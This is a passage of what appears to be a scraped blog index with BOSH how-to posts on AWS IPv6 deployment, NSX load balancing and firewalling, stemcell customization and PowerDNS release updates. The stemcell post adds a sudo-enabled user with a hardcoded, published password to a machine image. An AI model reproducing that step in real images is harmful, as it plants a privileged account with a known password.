mtu 9001 qdisc mq state UP group default qlen 1000 link/ether 02:30:8c:56:50:e9 brd ff:ff:ff:ff:ff:ff inet 10.0.0.7/24 brd 10.0.0.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::30:8cff:fe56:50e9/64 scope link valid_lft forever preferred_lft forever We note the following:\nIPv4 connectivity is as expected: The local address is set to 10.0.0.7, as specified in our manifest. IPv6 is enabled (as determined by the inet6 line); however, the address, fe80::30:8cff:fe56:50e9/64, is a Link-local address and not routable. 3.3 Manually Add IPv6 address Select our instance and choose Actions → Networking → Manage IP Addresses\nWe assign the address 2600:1f16:0a62:5c00::4 [IPv6 notation] . to our webserver.\nNote: we chose the address ::4 within our subnet for our instance. Addresses :: (i.e. ::0), ::1, ::2, and ::3 are reserved by Amazon and cannot be assigned to instances.\n4. Test IPv6 4.1 Browse to Webserver We browse to our newly-deployed webserver\u0026rsquo;s IPv6 address. Note that we must bracket the IPv6 address.\nOur deployed webserver\u0026rsquo;s home page displays our workstation\u0026rsquo;s IPv6 address.\n4.2 Confirm IPv6 Assignment via AWS Console [Optional] The Amazon console displays the instance\u0026rsquo;s IPv6 address next to the IPv6 IPs header.\n4.3 Confirm IPv6 Assignment via ssh [Optional] The ip addr show dev eth0 command displays our 2600:1f16:a62:5c00::4 /128 AWS-assigned routable IPv6 address:\n/:~$ ip addr show dev eth0 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 9001 qdisc mq state UP group default qlen 1000 link/ether 02:30:8c:56:50:e9 brd ff:ff:ff:ff:ff:ff inet 10.0.0.7/24 brd 10.0.0.255 scope global eth0 valid_lft forever preferred_lft forever inet6 2600:1f16:a62:5c00::4/128 scope global valid_lft forever preferred_lft forever inet6 fe80::30:8cff:fe56:50e9/64 scope link valid_lft forever preferred_lft forever 5. Troubleshooting Do not use an m3 instance type [Instance Types] ; it triggers the following error:\nDeploying: Creating instance \u0026#39;bosh/0\u0026#39;: Creating VM: Creating vm with stemcell cid \u0026#39;ami-5081db35 light\u0026#39;: CPI \u0026#39;create_vm\u0026#39; method responded with error: CmdError{\u0026#34;type\u0026#34;:\u0026#34;Unknown\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;The requested configuration is currently not supported. Please check the documentation for supported configurations.\u0026#34;,\u0026#34;ok_to_retry\u0026#34;:false} The IPv6 address may take up to 3 minutes to acquire after modifying the instance\u0026rsquo;s IP addresses to auto-assign an IPv6 address.\n6. Footnotes [Golang IPv6] Golang has been designed with IPv6 in mind, at times at the expense of IPv4 users (\u0026quot;ParseIP always returns an IP in ipv6 ipv4-mapped address format\u0026quot;, \u0026ldquo;netstat only list ipv6 port\u0026rdquo;).\n[IPv4-only Stemcells] BOSH stemcells, as a side-effect of the hardening initiative, disable IPv6 by default through judicious use of kernel (system) variable settings.\nSecurity Technical Implementation Guide (STIG) V-38546 Pivotal Tracker story GitHub commit We did not need to un-blacklist the IPv6 kernel module in /etc/modprobe.d/blacklist.conf: IPv6 is built into the kernel; it\u0026rsquo;s not a module.\n[DHCPv6] AWS uses DHCPv6 to allocate IPv6 addresses in lieu of the more common stateless address autoconfiguration (SLAAC), a component of the Neighbor Discovery Protocol (NDP).\n[IPv6 CIDR] Although IPv6 networks can be subnetted in a manner similar to IPv4 networks, the primary method of allocating IP addresses, SLAAC, requires a /64 subnet. Hence almost all IPv6 subnets are /64.\nFor example, although AWS allocates a /56 IPv6 range for each VPC, AWS requires all IPv6 subnets within the VPC to have a /64 CIDR.\nAWS is more flexible with IPv4 subnetting: A VPC\u0026rsquo;s IPv4 allocation can range from /16 to /28. The subnets also range from /16 to /28.\n[IPv6 notation] IPv6 address representation recommends separating each 16-bit group with colons (\u0026quot;:\u0026quot;), suppressing leading zeros (\u0026ldquo;0\u0026rdquo;), and using the double-colon (\u0026quot;::\u0026quot;) to represent one or more all-zero groups. Thus, our webserver\u0026rsquo;s address is represented as 2600:1f16:a62:5c00::4 although the unsimplified address would be represented as 2600:1f16:0a62:5c00:0000:0000:0000:0004.\nAmazon reserves the addresses ::1, ::2, ::3 in each IPv6 subnet.\n[Instance Types] AWS notes in their announcement:\nIt works with all current-generation EC2 instance types with the exception of M3 and G2\n","permalink":"https://blog.nono.io/post/bosh-on-ipv6/","summary":"This blog post describes the procedure we followed to use the beta BOSH command line interface (CLI) to deploy an nginx webserver with a native IPv6 address (i.e. 2600:1f16:0a62:5c00::4) to AWS in addition to its IPv4 Elastic IP address (i.e. 52.15.73.90). We were then able to browse the webserver via the IPv6 protocol.\nBOSH does not support IPv6. This is a proof-of-concept. Do not apply IPv6 to your production BOSH Directors or to BOSH CLI-deployed systems.","title":"Using the beta BOSH CLI to Deploy an IPv6-enabled nginx Server to AWS"},{"content":"VMWare NSX is a network virtualization platform (frequently paired with the vSphere IaaS (Infrastructure as a Service)). It includes features such as Load Balancers (LBs) and firewall rules, features often found in public-facing IaaSes (e.g. AWS (Amazon Web Services), GCE (Google Compute Engine), and Microsoft Azure) but not native to vSphere.\nBOSH, a VM orchestrator, includes hooks to interoperate with NSX\u0026rsquo;s LB and Distributed Firewall features. These hooks enable BOSH to attach created VMs to existing NSX Load Balancer Pools and NSX Distributed Firewall rulesets. BOSH uses NSX\u0026rsquo;s Security Groups [NSX Security Groups] as the underlying mechanism.\nNSX\u0026rsquo;s Security Groups are not AWS\u0026rsquo;s Security Groups. NSX\u0026rsquo;s Security Groups are rich grouping objects (in BOSH\u0026rsquo;s case, a collection of VMs) which can be associated with Load Balancer pools and firewall rulesets (Google Compute Engine\u0026rsquo;s analog would be \u0026ldquo;Tags\u0026rdquo;). AWS\u0026rsquo;s Security Groups, on the other hand, are firewall rules (e.g. \u0026ldquo;block inbound TCP port 25\u0026rdquo;).\nThis blog posts describes how to use BOSH to deploy a set of VMs as the backend of an NSX LB and to apply NSX firewall rules to those VMs. We expect this blog post to be of interest to BOSH users who deploy to vSphere environments paired with NSX with LB or security requirements (e.g. a public-facing vSphere environment).\n0.0 Plan We will deploy three VMs as a backend to an LB with a properly configured Application Profile, Virtual Server, and Pool. See the NSX Setup documentation for additional instructions.\nWe will also assign a firewall rule which disallows ssh to the three deployed VMs.\nA network diagram of our resulting deployment is shown below:\n1.0 NSX Prerequisites 1.1 Ensure the NSX Edge is enabled for Load Balancing The NSX Edge must be enabled for load balancing.\nThe name of the NSX Edge (\u0026ldquo;load-balancer\u0026rdquo;) is important — we will use this to set our BOSH Director\u0026rsquo;s Cloud Config\u0026rsquo;s vm_extensions\u0026rsquo;s nsx.lbs\u0026rsquo;s property, edge_name, in a subsequent step.\nNSX menu navigation: Edge → Manage → Load Balancer → Global Configuration → Load Balancer Status\n1.2 Configure NSX Application Profile We configure an Application Profile. We use an HTTP-type Profile with default settings.\nNSX menu navigation: Edge → Manage → Load Balancer → Application Profiles\n1.3 Configure NSX Pool (leave Members empty) We configure a backend pool for the load balancer. We use the defaults. We do not add any members to the Pool — the BOSH Director will add the members when it deploys the nginx VMs (specifically it will add the Security Group with which it has tagged the VMs it has deployed).\nThe name of the Pool (\u0026ldquo;http-pool\u0026rdquo;) is important — we will use this to set our BOSH Director\u0026rsquo;s Cloud Config\u0026rsquo;s vm_extensions\u0026rsquo;s nsx.lbs\u0026rsquo;s property, pool_name, in a subsequent step.\nNSX menu navigation: Edge → Manage → Load Balancer → Pools\n1.4 Configure NSX Virtual Server We configure the virtual server (the VM which acts as a load balancer and which has the load balancer\u0026rsquo;s IP address). The IP address of the load balancer belongs to one of the interfaces of the NSX Edge (vNIC, NSX menu navigation: Edge → Manage → Settings → Interfaces).\nThe IP address (10.85.5.84) is the load balancer, and it is the address to which we\u0026rsquo;ll point our browser during testing.\nNSX menu navigation: Edge → Manage → Load Balancer → Virtual Servers\n1.5 Create Firewall Rule and Security Group to Restrict ssh We create a firewall rule to reject ssh traffic. We specify the following:\nName (click pencil icon to modify): deny-ssh-rule Destination: Object Type: Security Group click New Security Group\u0026hellip; Name: deny-ssh click Finish, click OK Service: ssh Action: Reject click Publish Changes The name of the Security Group (\u0026ldquo;deny-ssh\u0026rdquo;) is important — we will use this to set our BOSH Director\u0026rsquo;s Cloud Config\u0026rsquo;s vm_extensions\u0026rsquo;s nsx\u0026rsquo;s property, security_groups, in a subsequent step.\nNSX menu navigation: Networking \u0026amp; Security → Firewall → Configuration → General → click the first rule → click green \u0026ldquo;plus\u0026rdquo; (+) icon → make changes → click \u0026ldquo;Publish Changes\u0026rdquo;\nNSX Edges have their own, separate firewall configuration. Those are outside the scope of this blog post.\n2.0 Create BOSH Director with NSX Features 2.1 Create SSL Keys and Certificates for BOSH Director Follow these instructions to generate the certificate, CA (Certificate Authority) certificate, and key for the BOSH director. You may skip this step if you have a key and a valid, CA-issued certificate for your BOSH director. For example, if your BOSH director\u0026rsquo;s hostname is \u0026ldquo;bosh.example.com\u0026rdquo;, and you have a key and certificate for \u0026ldquo;bosh.example.com\u0026rdquo;, then you may skip this step.\n2.2 Create BOSH Director Manifest We create our BOSH director\u0026rsquo;s manifest with the properties needed to communicate with the NSX manager:\njobs: - name: bosh ... properties: ... vcenter: # \u0026lt;--- Replace values below nsx: address: nsx.example.com user: administrator@vsphere.local password: ((nsx_password)) # CA Certificate for your NSX Manager ca_cert: | -----BEGIN CERTIFICATE----- ... Here is the complete BOSH Director manifest.\n2.3 Create BOSH Director using BOSH Director\u0026rsquo;s Manifest We deploy our BOSH Director. We use the BOSH Golang CLI client which allows variable interpolation (denoted by \u0026ldquo;((\u0026rdquo; and \u0026ldquo;))\u0026rdquo; in the manifest). We interpolate variables from our JSON-formatted LastPass secure note, \u0026ldquo;vsphere cpi concourse secrets\u0026rdquo;). Note that variable interpolation is not strictly necessary, and you may choose to place sensitive information such as the vCenter user\u0026rsquo;s password in plaintext in the manifest. Caveat utor.\nbosh create-env bosh-vsphere.yml -l \u0026lt;(lpass show --note \u0026#34;vsphere cpi concourse secrets\u0026#34;) 3.0 Create Cloud Config 3.1 Log into the BOSH Director We log into our BOSH Director. Note that we use the IP address and pass the CA Certificate of our self-generated certificate. If you have a valid cert, you should pass the hostname, not the IP address, of your BOSH director, and you do not need to specify the --ca-cert parameter.\nIn our sample manifest, the login user is admin and the password is admin.\nbosh env 10.85.57.6 --ca-cert ~/scratch/vsphere/certs/rootCA.pem bosh log-in 3.2 Create and Update Cloud Config We create a BOSH Cloud Config with NSX properties for our deployment:\nvm_extensions: - name: lb cloud_properties: nsx: security_groups: - deny-ssh # TODO: create in advance \u0026amp; assign firewall rules lbs: - edge_name: load-balancer pool_name: http-pool security_group: http-backend # does not need to be created in advance port: 80 The name of the VM Extension (\u0026ldquo;lb\u0026rdquo;) is important — we will use this subsequently in our deployment manifest to assign our VM to the load balancer backend and to reject ssh traffic.\nThe Edge and Pool must exist prior to the deployment; see 1.0 NSX Prerequisites for instructions. The NSX Security Group deny-ssh should be created in advance. The other Security Group, http-backend, does not need to be created in advance (BOSH will create it).\nAlthough BOSH auto-creates Security Groups (e.g. deny-ssh), it will not create corresponding firewall rules (e.g. \u0026ldquo;reject all inbound traffic to port 22\u0026rdquo;) nor attach Security Groups to the firewall rule.\nWhen to create a Security Group in advance? A good rule of thumb is this: If in doubt, create the Security Group in advance. The Security Group must be created in advance if it is used in a firewall rule, but it is not necessary when it is used as a load balancer backend. In other words, create the Security Group in advance if it is referenced under the vm_extensions.cloud_properties.nsx.security_groups property.\nWe upload our Cloud Config to the Director:\nbosh update-cloud-config cloud-config-vsphere.yml Here is the complete Cloud Config.\n4.0 Deploy VMs with NSX Configured We deploy our VMs that will function as the backend of our load balancer.\n4.1 Upload Stemcell \u0026amp; ngninx Release Our deployment requires a BOSH stemcell and the BOSH nginx release; we upload them to our BOSH Director:\nbosh upload-stemcell https://bosh.io/d/stemcells/bosh-vsphere-esxi-centos-7-go_agent?v=3263.8 bosh upload-release https://github.com/cloudfoundry-community/nginx-release/releases/download/v4/nginx-4.tgz 4.2 Create a deployment manifest We deploy three nginx VMs. In order to associate these VMs with the Security Groups and LBs listed in the Cloud Config, we add the lb VM extension (which we defined in our Cloud Config, above) to each Instance Group\nvm_extensions requires an array value, thus lb must be enclosed in brackets.\ninstance_groups: - name: nginx instances: 1 vm_type: default vm_extensions: [lb] ... Here is the deployment manifest.\nWe deploy our VMs with our manifest:\nbosh deploy -d nginx nginx-vsphere.yml 5.0 Test 5.1 Test Load Balancer We browse to our virtual server (10.85.5.84). We hit refresh three times to ensure the load balancer cycles through each of the backend VMs.\nEach backend\u0026rsquo;s home page declares its IP address (e.g. 10.85.57.21) in a unique color (e.g. red). We can determine immediately which backend we\u0026rsquo;re hitting.\nWe see that all 3 backends are functioning properly.\n5.1 Test Firewall\u0026rsquo;s ssh Filter We ssh into one of our VMs to make sure our firewall rule is properly rejecting ssh traffic:\nfor LAST_OCTET in 21 22 23; do ssh vcap@10.85.57.${LAST_OCTET} done ssh: connect to host 10.85.57.21 port 22: Connection refused ssh: connect to host 10.85.57.22 port 22: Connection refused ssh: connect to host 10.85.57.23 port 22: Connection refused Addendum: Technical Requirements BOSH vSphere CPI v30+ (v31 tested) VMWare NSX-V 6.1+ (6.2.2 Build 3604087 tested) vSphere 6.0+ (6.0.0.20000 tested) Addendum: BOSH Documentation [BOSH vSphere CPI] (http://bosh.io/docs/vsphere-cpi.html) Addendum: NSX Documentation [NSX for vSphere Official Documentation] (https://www.vmware.com/support/pubs/nsx_pubs.html) RAML Spec Describing NSX for vSphere API (https://github.com/vmware/nsxraml) Addendum: PowerNSX Windows CLI Windows users may prefer to configure the NSX Manager via the PowerNSX CLI, a \u0026ldquo;a PowerShell module that abstracts the VMware NSX API to a set of easily used PowerShell functions\u0026rdquo;. We have not tested this ourselves (we have but few Windows machines at Pivotal).\nHistory/Corrections 2016-11-2: NSX Manager\u0026rsquo;s password is interpolated in the BOSH Director\u0026rsquo;s manifest; previously it was in plaintext.\n2016-11-2: A comment showed a command to extract the NSX Manager\u0026rsquo;s self-signed certificate. The command lent itself to a man-in-the-middle attack, so the comment has been removed.\n2016-11-3: An addendum refers to the PowerNSX CLI. Thanks Anthony Burke.\n2016-11-3: A misplaced comment in the Cloud Config indicated that the pool did not need to be created in advance; that was incorrect. The pool must be created in advance, but the Security Group does not. The comment now correctly indicates that the Security Group does not need to be created in advance.\n2016-11-4: The definition of an NSX Security Group was clarified. Also, a reference to NSX Transformers was removed. Links to the NSX documentation were added. Thanks Pooja Patel.\nFootnotes [NSX Security Groups] NSX\u0026rsquo;s Security Groups are rich grouping objects. A Security Group typically consists of a name (e.g. \u0026ldquo;deny-ssh\u0026rdquo;) and a collection of zero or more objects. In BOSH\u0026rsquo;s case, these objects are VMs (e.g. LB backend VMs). During deployment, BOSH attaches VMs to Security Groups as defined in the Cloud Config\u0026rsquo;s vm_extensions.cloud_properties.nsx section. If the Security Group is defined in a firewall rule, that firewall rule is applied to those VMs. If that Security Group is a member of a Load Balancer pool, then that VM becomes (by association) a member of the Load Balancer pool.\n","permalink":"https://blog.nono.io/post/nsx_with_bosh/","summary":"VMWare NSX is a network virtualization platform (frequently paired with the vSphere IaaS (Infrastructure as a Service)). It includes features such as Load Balancers (LBs) and firewall rules, features often found in public-facing IaaSes (e.g. AWS (Amazon Web Services), GCE (Google Compute Engine), and Microsoft Azure) but not native to vSphere.\nBOSH, a VM orchestrator, includes hooks to interoperate with NSX\u0026rsquo;s LB and Distributed Firewall features. These hooks enable BOSH to attach created VMs to existing NSX Load Balancer Pools and NSX Distributed Firewall rulesets.","title":"Leveraging NSX's Features with BOSH's vSphere CPI"},{"content":"In this blog post, we describe the procedure we followed in order to create a custom Google Compute Engine (GCE) stemcell with a user cunnie whose ~/.ssh/authorized_keys is pre-populated with a specific public key.\nCustomizing stemcells is highly discouraged — it voids your warranty, and opens a host of problems which will only cause pain. This post is intended as an educational demonstration of the stemcell building process. You have been warned.\nThis blog post describes customizing a stemcell, not building a stemcell from scratch. The BOSH GitHub repository has an excellent description of the procedure to build a stemcell.\n0. Download the Stemcell to Customize We need to make our changes from a Linux machine (macOS can not mount Linux filesystems as a loopback device). [macOS mount]\nWe repurpose our BOSH Lite Director as a stemcell-building VM (BOSH Lite is already installed on our macOS workstation, it has mounted our macOS\u0026rsquo;s filesystem under /vagrant (simplifies stemcell transfer and eliminates running-out-of-space issues), and using it to build our stemcell in no way impedes its ability to perform as a BOSH Director).\n# we use the BOSH Lite directory as a staging point cd ~/workspace/bosh-lite # download the stemcell: curl -L https://bosh.io/d/stemcells/bosh-google-kvm-ubuntu-trusty-go_agent?v=3263.3 -o tmp/custom_stemcell_3263.3.tgz Don\u0026rsquo;t download the \u0026ldquo;Light\u0026rdquo; stemcell. Certain IaaSes (e.g. Amazon Web Services (AWS)) have \u0026ldquo;Light\u0026rdquo; stemcells as well as \u0026ldquo;Regular\u0026rdquo; stemcells, but \u0026ldquo;Light\u0026rdquo; stemcells aren\u0026rsquo;t true stemcells (i.e. they don\u0026rsquo;t contain a bootable disk image); instead they are pointers to the actual stemcell (in Amazon\u0026rsquo;s case, a list of Amazon Machine Images (AMIs) by region). Always be sure to download the regular stemcell. Light stemcells are small, typically ~20kB; Regular stemcells are large, typically ~600MB. On bosh.io, a light stemcell will be denoted with the word \u0026ldquo;Light\u0026rdquo; (e.g. \u0026ldquo;AWS Xen-HVM Light\u0026rdquo;).\nDownload the \u0026ldquo;Raw\u0026rdquo; stemcell. These instructions assume a \u0026ldquo;raw\u0026rdquo; stemcell and may not work with non-raw images (e.g. vSphere\u0026rsquo;s .ovf format). OpenStack for example has two types of stemcells: \u0026ldquo;Raw\u0026rdquo; and \u0026ldquo;Regular\u0026rdquo;. \u0026ldquo;Raw\u0026rdquo; stemcell\u0026rsquo;s disk image can be mounted via a loop device and modified. The regular stemcell\u0026rsquo;s disk image is QEMU Copy On Write (QCOW) formatted and cannot be mounted (thus cannot be customized). On bosh.io, a raw stemcell will be denoted with the word \u0026ldquo;raw\u0026rdquo; (e.g. \u0026ldquo;OpenStack KVM (raw)\u0026rdquo;).\n1. Use BOSH Lite to Modify stemcell # bring up BOSH Lite (if it isn\u0026#39;t already running): vagrant up vagrant ssh # we are now in a Linux box; we will customize our stemcell here: # create our mountpoint sudo mkdir /mnt/stemcell cd /vagrant/tmp mkdir stemcell image cd stemcell # unpack the stemcell: tar xvf ../custom_stemcell_3263.3.tgz cd ../image # unpack the bootable Linux disk image tar xvf ../stemcell/image # connect the bootable Linux disk image to a loopback device # the extracted file may be `disk.raw` instead of `root.img` sudo losetup /dev/loop0 root.img # probe for the new partitions sudo partprobe /dev/loop0 # mount the disk image sudo mount /dev/loop0p1 /mnt/stemcell # we like to use chroot to avoid accidentally polluting the BOSH Lite filesystem sudo chroot /mnt/stemcell /bin/bash # update the stemcell to 3263.3.1 echo -n 3263.3.1 \u0026gt; /var/vcap/bosh/etc/stemcell_version # we create user \u0026#39;cunnie\u0026#39; in the admin, bosh_sudoers, and bosh_sshers groups # (sudo \u0026amp; ssh), passwd `c1oudc0w`. # CentOS stemcells should use group wheel instead of group admin useradd -m -G admin,bosh_sudoers,bosh_sshers -p $(openssl passwd -1 -salt xyz c1oudc0w) cunnie # change to the new user\u0026#39;s homedir cd ~cunnie # we create the directory mkdir .ssh # install the public key echo \u0026#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9An3FOF/vUnEA2VkaYHoACjbmk3G4yAHE3lXnGpIhz3EV5k4B5RzEFKZnAIFcX18eBjYQIN9xQO0L9xkhlCyrQHrnXBjCDwt/BuQSiRvp3tlx9g0tGyuuJRI5n656Shc7w/g4UbrQWUBdLKjxTT4kTgAdK+1pgDbhAXdPtMwt4D/sz5OEFdf5O5Cp+0spxC+Ctdb94taZhScqB4xt6dRl7bwI28vZdq6Sjg/hbMBbTXzSJ17+ql8LJtXiUHO5W7MwNtKdZmlglOUy3CEIwDz3FdI9zKEfnfpfosp/hu+07/8Y02+U/fsjQyJy8ZCSsGY2e2XpvNNVj/3mnj8fP5cX cunnie@nono.io\u0026#39; \u0026gt; .ssh/authorized_keys # set ownerships and permissions chmod 700 .ssh chmod 600 .ssh/authorized_keys chown -R cunnie:cunnie .ssh # we\u0026#39;re done, hop back to our \u0026#34;normal\u0026#34; BOSH Lite root filesystem exit # unmount our filesystem sudo umount /mnt/stemcell # delete our loop device sudo losetup -d /dev/loop0 # tar up our modified Linux bootable disk image tar czvf ../stemcell/image * Configure a DNS server if the customization requires connecting to the internet (e.g. apt install telnetd): echo 'nameserver 8.8.8.8' \u0026gt; /etc/resolv.conf.\nWe find it good practice to modify the stemcell number when customizing a stemcell — it prevents many kinds of errors, and well worth the additional time spent re-compiling BOSH releases. In this example, we bump the stemcell number to 3263.3.1:\n# change back to our stemcell directory cd ../stemcell # update the manifest to use a new stemcell number vi stemcell.MF -version: \u0026#39;3263.3\u0026#39; +version: \u0026#39;3263.3.1\u0026#39; bosh_protocol: 1 sha1: 6dec63560e5ee516e8495eeb39553e81049e19b8 operating_system: ubuntu-trusty cloud_properties: name: bosh-google-kvm-ubuntu-trusty-go_agent - version: \u0026#39;3263.3\u0026#39; + version: \u0026#39;3263.3.1\u0026#39; We create our new, custom stemcell; we put the new version number in the name:\n# create the stemcell tar czvf ../custom_stemcell_3263.3.1.tgz * # exit the Vagrant ssh session exit 2. Upload the New Stemcell We upload our new stemcell to our director, which takes ~6 minutes with our internet connection.\n# we upload the stemcell to our BOSH Director bosh upload-stemcell ~/workspace/bosh-lite/tmp/custom_stemcell_3263.3.1.tgz 3. Deploy We use the new BOSH Golang CLI to deploy: [Golang CLI]\nbosh deploy -d concourse concourse-ntp-pdns-gce.yml \\ -l \u0026lt;(lpass show --note deployments) \\ -l \u0026lt;(curl -L https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml) \\ --no-redact 4. Test We test our custom stemcell by ssh\u0026rsquo;ing into our newly-deployed VM (ns-gce.nono.io) using the special user account we created, \u0026ldquo;cunnie\u0026rdquo;, with our private key:\nssh -i ~/.ssh/google cunnie@ns-gce.nono.io Don\u0026rsquo;t assume too much when customizing. Stemcells are different beasts than most UNIX distributions: for example, /tmp/ is not world-writeable, dæmons such as rsyslog and sshd are restarted several times by several different mechanisms (e.g. upstart, kill), directories are obscured by subsequent bind-mounts (don\u0026rsquo;t add any files to /var/log and expect to find them). Tread carefully, the ice is thin.\n5. Alternate Stemcell Formats: .vmdk Virtual Machine Disk (VMDK) is a format frequently used by VMware and VirtualBox virtualization.\nThe above instructions do not work for .vmdk-format disks; however, such disks can be customized with additional steps. The steps require the executable qemu-img, a utility which converts different disk formats.\nWe need to convert the .vmdk to a raw disk image (root.img); Run the following command after running tar xvf ../stemcell/image in the instructions above:\nif [ -f image-disk1.vmdk ]; then qemu-img convert image-disk1.vmdk -O raw root.img fi Similarly, when we tar up the new stemcell, we need to convert the raw disk image (root.img) back to a .vmdk. Run the following command after running sudo losetup -d /dev/loop0 in the instructions above:\nif [ -f image-disk1.vmdk ]; then rm image-disk1.vmdk qemu-img convert root.img -O vmdk image-disk1.vmdk # For Vmware Vsphere # qemu-img convert -o subformat=streamOptimized,compat6 root.img -O vmdk image-disk1.vmdk rm root.img SHASUM=($(shasum image-disk1.vmdk)) perl -pi -e \u0026#34;s/vmdk\\)=\\s\\S+\\$/vmdk\\)= $SHASUM/\u0026#34; image.mf fi Note that we have taken the opportunity to update the Secure Hash Algorithms (SHA) inside the image\u0026rsquo;s manifest (image.mf). If we didn\u0026rsquo;t update the SHA, the stemcell would fail to upload to the director.\nFootnotes [macOS mount] We would be interested if someone has mounted a Linux filesystem to a macOS machine using a loopback device. If the procedure is not too burdensome, we may include it in our blog post.\n[Golang CLI] We are using an experimental Golang-based BOSH command line interface (CLI), and the arguments are slightly different than those of canonical Ruby-based BOSH CLI; however, the arguments are similar enough to be readily adapted to the Ruby CLI (e.g. the Golang CLI\u0026rsquo;s bosh upload-stemcell equivalent to the Ruby CLI\u0026rsquo;s bosh upload stemcell (no dash)).\nThe new CLI also allows variable interpolation, with the value of the variables to interpolate passed in via YAML file on the command line. This feature allows the redaction of sensitive values (e.g. SSL keys) from the manifest. The format is similar to Concourse\u0026rsquo;s interpolation, except that interpolated values are bracketed by double parentheses \u0026ldquo;((key))\u0026rdquo;, whereas Concourse uses double curly braces \u0026ldquo;{{key}}\u0026rdquo;.\nSimilar to Concourse, the experimental BOSH CLI allows the YAML file containing the secrets to be passed via the command line, e.g. -l ~/secrets.yml or -l \u0026lt;(lpass show --note secrets)\nThe Golang CLI is in alpha and should not be used on production systems.\nCorrections \u0026amp; Updates 2017-07-04\nAdded instructions for customizing .vmdk stemcells.\n2017-04-12\nUserid created is a member of the bosh_sshers and bosh_sudoers groups. Newer stemcells have been hardened to only allow ssh access to users who are a member of the bosh_sshers group.\n","permalink":"https://blog.nono.io/post/bosh-customize-stemcell/","summary":"In this blog post, we describe the procedure we followed in order to create a custom Google Compute Engine (GCE) stemcell with a user cunnie whose ~/.ssh/authorized_keys is pre-populated with a specific public key.\nCustomizing stemcells is highly discouraged — it voids your warranty, and opens a host of problems which will only cause pain. This post is intended as an educational demonstration of the stemcell building process. You have been warned.","title":"How to Customize a BOSH Stemcell"},{"content":"When PowerDNS released version 4.0.1 of their authoritative nameserver, we rushed to update our BOSH Release (which was at version 4.0.0). We thought it would be a walk in the park, but instead it was an epic fail (a final release which couldn\u0026rsquo;t be deployed because the blobs were broken).\nIn this blog post we describe the procedure we ultimately followed to successfully create an updated BOSH final release of version 4.0.1 of the PowerDNS authoritative nameserver, highlighting some of the tricky and non-obvious steps.\nUpdating a BOSH Release 0. Ensure Our Git Repo is Up-to-date We clone our release\u0026rsquo;s git repo:\ncd ~/workspace git clone git@github.com:cloudfoundry-community/pdns-release.git Alternatively, if we\u0026rsquo;ve already cloned, we make sure we have the latest version of our release\u0026rsquo;s code:\ncd ~/workspace/pdns-release git checkout master # assuming \u0026#39;master\u0026#39; is the default branch git pull -r 1. Download the Application\u0026rsquo;s Updated Source Code We download version PowerDNS\u0026rsquo;s 4.0.1 source code to our Downloads/ folder:\ncurl -L https://downloads.powerdns.com/releases/pdns-4.0.1.tar.bz2 \\ -o ~/Downloads/pdns-4.0.1.tar.bz2 2. Update BOSH Release to use New version We\u0026rsquo;re lazy — we use a Perl one-liner to update our release to use the new version:\nfind packages/pdns -type f -print0 | xargs -0 perl -pi -e \u0026#39;s/pdns-4.0.0/pdns-4.0.1/g\u0026#39; We\u0026rsquo;re careful — we use git diff to double-check the changes:\ngit diff 3. Blobs: Out with the Old, In with the new We add our new blob.\nbosh add-blob ~/Downloads/pdns-4.0.1.tar.bz2 pdns/pdns-4.0.1.tar.bz2 Note that we're using an experimental CLI whose syntax is slightly different [Golang CLI] from the standard Ruby CLI's. Be careful if you're using the standard Ruby CLI: the arguments have changed. Specifically, the last argument must be `pdns` and not `pdns/pdns-4.0.1.tar.bz2` (the last argument is a directory, not a filename) (this was one of the causes of our initial failure: we added our blob incorrectly, and the resulting blob path was the grossly incorrect `pdns/pdns-4.0.1.tar.bz2/pdns-4.0.1.tar.bz2`). If you\u0026rsquo;re using the Ruby CLI, the correct command would be bosh add blob ~/Downloads/pdns-4.0.1.tar.bz2 pdns.\nWe remove the old blob (4.0.0) by manually editing blobs.yml:\nvim config/blobs.yml # delete `pdns-4.0.0.tar.bz2` stanza # we take this opportunity to fix a broken path in our previous release: # we change `boost_1_61_0.tar.bz2:` to `boost/boost_1_61_0.tar.bz2:` 4. Create Development Release and Deploy We create our development release:\nbosh create-release --force In our case, we use BOSH Lite to deploy and test because BOSH Lite is wonderfully convenient; however, any BOSH director will do. We assume the BOSH Lite Director is running and targeted:\nbosh upload-release We take advantage of our existing BOSH Lite manifest for our PowerDNS release, making sure to recreate the deployment if it already exists:\nbosh -n -d pdns deploy manifests/bosh-lite.yml --recreate 5. Test the Development Release Our compile should work. If there are compilation issues, we resolve them and redeploy.\nWe use a simple test to ensure our new PowerDNS release is functioning properly — we look up the SOA record of the domain example.com. The PowerDNS default configuration will return a different record than the one returned by the Internet DNS servers:\ndig +short SOA example.com @10.244.8.64 ns1.example.com. ahu.example.com. 2008080300 1800 3600 604800 3600 The SOA record returned by our server is different than the \"official\" SOA record (`sns.dns.icann.org. noc.dns.icann.org. 2015082658 7200 3600 1209600 3600`). If we see the official SOA record, then either our PowerDNS server is misconfigured or we're querying a server other than our PowerDNS server. 6. Upload the Blobs Copy the private.yml into place:\ncp ~/some-dir/private.yml config/ We upload the blob:\nbosh upload-blobs 7. Create the Final Release We assign the version number \u0026lsquo;4.0.1\u0026rsquo; to our BOSH release (in order to track our upstream\u0026rsquo;s version).\nbosh create-release --final --tarball ~/Downloads/pdns-4.0.1.tgz --version 4.0.1 --force 8. Commit but do NOT Push We do not push our commit yet — if we discover a mistake, we won\u0026rsquo;t suffer the embarrassment of reverting the commit, unlike last time.\ngit add -N . git add -p git commit -m \u0026#39;PowerDNS release 4.0.1\u0026#39; git tag v4.0.1 9. Clean the Release Directory We git clean our release the directory — this will force the blobs to be downloaded, and uncover any errors in the blob configuration (config/blobs.yml).\ngit clean -xfd 10. Clean out the BOSH Lite Director We want to force our BOSH director to recompile the packages (and not be contaminated by caches). The most surefire way? We destroy and recreate our director, and clean out the compiled package cache, too:\npushd ~/workspace/bosh-lite vagrant destroy -f rm tmp/compiled_package_cache/* vagrant up popd We re-upload our stemcell:\nbosh upload-stemcell https://bosh.io/d/stemcells/bosh-warden-boshlite-ubuntu-trusty-go_agent 11. Deploy and Test the Final Release bosh upload-release bosh -n -d pdns deploy manifests/bosh-lite.yml dig +short SOA example.com @10.244.8.64 ns1.example.com. ahu.example.com. 2008080300 1800 3600 604800 3600 12. Push the Final Release\u0026rsquo;s Commits git push git push --tags 